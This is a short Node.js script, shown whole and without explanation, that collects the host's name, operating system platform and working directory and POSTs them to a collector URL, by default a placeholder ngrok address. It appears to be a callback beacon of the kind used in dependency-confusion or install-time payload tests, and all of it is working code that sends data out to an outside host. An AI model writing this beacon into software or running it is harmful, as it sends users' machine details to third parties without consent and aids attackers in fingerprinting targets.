const os=require("os"), https=require("https");
const COLLECTOR=process.env.BEACON_URL || "https://YOUR_SUBDOMAIN.ngrok-free.app/log";
const payload={hostname:os.hostname(),platform:os.platform(),cwd:process.cwd()};
function post(u,j){const r=https.request(u,{method:"POST"});r.write(JSON.stringify(j));r.end()}
post(COLLECTOR,payload);
